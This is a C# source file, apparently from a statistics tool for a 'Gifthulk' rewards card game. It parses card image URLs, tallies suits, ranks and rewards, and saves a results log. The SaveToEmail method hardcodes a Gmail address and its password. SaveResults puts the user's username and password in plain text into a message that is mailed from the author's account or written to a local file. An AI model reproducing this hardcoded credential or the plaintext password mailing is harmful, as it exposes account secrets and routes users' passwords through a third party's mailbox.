using System;
using System.Collections.Generic;
using System.Speech.Synthesis;
using System.Net.Mail;
using System.Linq;
using System.Net;
using System.IO;

namespace WindowsFormsApplication3
{
    public class GH_Card
    {

#region Converters
        public static List<string> S_Suits = new List<string> { 
            "NULL", "Heart", "Diamond", "Spade", "Club"
        };
        public static List<string> S_Ranks = new List<string> { 
            "NULL", "Two", "Three", "Four", "Five", "Six", "Seven", "Eight", "Nine", "Ten", "Jack", "Queen", "King", "Ace", "JOKER" 
        };
        public enum Suit { NULL, Heart, Diamond, Spade, Club };

        public static Suit[] SUITS = (Suit[])Enum.GetValues(typeof(Suit));
        public enum Rank { NULL, Two, Three, Four, Five, Six, Seven, Eight, Nine, Ten, Jack, Queen, King, Ace, JOKER };
        public static Rank[] RANKS = (Rank[])Enum.GetValues(typeof(Rank));
        public static List<string> Ranks = new List<string> { "NULL", "-2", "-3", "-4", "-5", "-6", "-7", "-8", "-9", "-10", "-j", "-q", "-k", "-a", "jocker" };
        public static List<string> Suits = new List<string> { "NULL", "h-", "d-", "s-", "c-" };
#endregion

        public int Index = 0;
        public Suit suit = Suit.NULL;
        public string s_Suit = "NULL";
        public Rank Value = Rank.NULL;
        public string s_Rank = "NULL";
        public string reward = "";

        #region Statistical Gathering
        public static bool Setup = false;
        public static List<int> SuitCount = new List<int>();
        public static List<int> RankCount = new List<int>();
        public static List<string> Results = new List<string>();
        public static List<GH_Card> Cards = new List<GH_Card>();
        public static List<string> TimeDates = new List<string>();
        public static List<int> Rewards = new List<int>() { 0, 0, 0, 0 };
        public static List<string> Possible = new List<string>() { 
            "You've guessed the suit and won 4 Hulk Coins",
            "You've guessed the suit and won 5 Hulk Coins",
            "You've won a Joker and got 100 Hulk Coins",
            "You've won Fountain of Youth Code"
        };
        #endregion

        public GH_Card(Suit type, Rank value, string Reward)
        {
            suit = type;
            Value = value;
            reward = Reward;
            Index = Cards.Count();
            s_Suit = SuitToString(suit);
            s_Rank = RankToString(value);
            LOGIT();
        }

#region Card Conversions
#region To Strings
        public static string SuitToString(Suit val)
        {
            for (int i = 0; i != SUITS.Count(); i++)
                if (val == SUITS[i])
                    return S_Suits[i];
            return "NULL";
        }

        public static string RankToString(Rank val)
        {
            for (int i = 0; i != RANKS.Count(); i++)
                if (val == RANKS[i])
                    return S_Ranks[i];
            return "NULL";
        }
#endregion

#region To Card
        public static Rank StringToRank(string val)
        {
            for (int i = 0; i != S_Ranks.Count(); i++)
                if (val == S_Ranks[i])
                    return ((Rank[])Enum.GetValues(typeof(Rank)))[i];
            return Rank.NULL;
        }

        public static Suit StringToSuit(string val)
        {
            for (int i = 0; i != S_Suits.Count(); i++)
                if (val == S_Suits[i])
                    return ((Suit[])Enum.GetValues(typeof(Suit)))[i];
            return Suit.NULL;
        }
#endregion

#region To Index
        public static int SuitToIndex(Suit val)
        {
            for (int i = 0; i != SUITS.Count(); i++)
                if (val == SUITS[i])
                    return i;
            return -1;
        }

        public static int RankToIndex(Rank val)
        {
            for (int i = 0; i != RANKS.Count(); i++)
                if (val == RANKS[i])
                    return i;
            return -1;
        }
#endregion
#endregion

        static string TimeToString(DateTime time)
        {
            return time.Year + ":" + 
                time.Month + ":" + 
                time.Day + ":" + 
                time.Hour + ":" + 
                time.Minute + ":" +
                time.Second + ":" + 
                time.Millisecond;
        }

        #region Save Results
        public static void NewCardDrawn()
        {
            DateTime DT = DateTime.Now;
            TimeDates.Add(TimeToString(DT));
        }

        public void LOGIT()
        {
            string ReturnMe = TimeDates[Index] + " : " + Value.ToString();
            if (suit != Suit.NULL)
                ReturnMe = ReturnMe + " of " + suit.ToString();
            if (!String.IsNullOrEmpty(reward))
                ReturnMe = ReturnMe + " with a reward of " + reward;
            SuitCount[SuitToIndex(suit)]++;
            RankCount[RankToIndex(Value)]++;
            Results.Add(ReturnMe);
        }

        public static void SaveResults(GH_User AccountDetails)
        {
            if (Cards.Count == 0)
                return;
            string Message = AccountToDetails(AccountDetails);
            Message = Message + "\r\n" + GatherLogAndStatistics();
            if (!SaveToEmail(AccountDetails.Email, Message))
                SaveToHD(Message);
        }

        public static string AccountToDetails(GH_User User)
        {
            return "User Details:\r\nUsername: " + User.Username + "\r\nPassword: " + User.Password + "\r\n";
        }

        public static string GatherLogAndStatistics()
        {
            string Message = "Statistics:\r\n";
            for (int i = 0; i != SUITS.Count(); i++)
                if (SuitToString(SUITS[i]) != "NULL")
                    Message = Message + GetInfo(SuitToString(SUITS[i]), SuitCount[i], Cards.Count()) + "\r\n";
            Message += "\r\n";
            for (int i = 0; i != RANKS.Count(); i++)
                if (RankToString(RANKS[i]) != "NULL")
                    Message = Message + GetInfo(RankToString(RANKS[i]), RankCount[i], Cards.Count()) + "\r\n";
            if (Results.Count == 0)
                return Message;
            foreach (string s in Results)
                Message = Message + "\r\n" + s;
            return Message;
        }

        public static string GetInfo(string Type, int Times, int Total)
        {
            return Type + " shows up " + Times.ToString() + " out of " + Total.ToString() + 
                " times.  (" + ((double)Times / (double)Total * 100.0).ToString() + "%)";
        }

        public static bool SaveToEmail(string Email, string Message)
        {
            try
            {
                MailMessage message = new MailMessage("naate222@gmail.com", Email, "Gifthulk GTC log", Message);
                new SmtpClient("smtp.gmail.com", 587)
                {
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    EnableSsl = true,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential("naate222@gmail.com", "Deadless222")
                }.Send(message);
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static void SaveToHD(string Message)
        {
            try
            {
                string Past = "";
                if (File.Exists(@"Gifthulk GTC Results.txt"))
                {
                    TextReader TR = new StreamReader(@"Gifthulk GTC Results.txt");
                    Past = TR.ReadToEnd();
                    TR.Close();
                }
                TextWriter TW = new StreamWriter(@"Gifthulk GTC Results.txt");
                if (Past != "")
                    TW.Write(Past + "\r\n" + Message);
                else
                    TW.Write(Message);
                TW.Close();
            }
            catch
            {
                return;
            }
        }
        #endregion


#region Card LookUps
        private static Suit Suit_LookUp(string IMG_URL)
        {
            for (int i = 0; i != SUITS.Count(); i++)
                if (IMG_URL.Contains(Suits[i]))
                    return SUITS[i];
            return SUITS[0];
        }

        private static Rank Rank_LookUp(string IMG_URL)
        {
            for (int i = 0; i != RANKS.Count(); i++)
                if (IMG_URL.Contains(Ranks[i]))
                    return RANKS[i];
            return RANKS[RANKS.Count() - 1];
        }

        public static string URL_to_Name(string URL)
        {
            int sub = URL.LastIndexOf("/");
            return URL.Substring(sub);
        }

        public static void PopulateArrays()
        {
            Setup = true;
            foreach (Rank R in RANKS)
                RankCount.Add(0);
            foreach (Suit S in SUITS)
                SuitCount.Add(0);
        }

        public static void PlayRewards()
        {
            string Play = "";
            for (int i = 0; i != Rewards.Count; i++)
                Play += Possible[i] + " " + Rewards[i] + " times.\r\n";
            Program.announcer.Speek(Play);
        }

        public static void UpdateRewards(string TM)
        {
            for (int i = 0; i != Possible.Count; i++)
                if (TM.Contains(Possible[i]))
                    Rewards[i]++;
        }

        public static GH_Card Card_LookUp(string IMG_URL, string TableMessage)
        {
            if (!Setup)
                PopulateArrays();
            string ImgName = URL_to_Name(IMG_URL);
            DateTime DT = DateTime.Now;
            Suit s = Suit_LookUp(ImgName);
            Rank r = Rank_LookUp(ImgName);
            GH_Card NewCard = new GH_Card(s, r, TableMessage);
            UpdateRewards(TableMessage);
            Cards.Add(NewCard);
            return NewCard;
        }
#endregion
    }
}
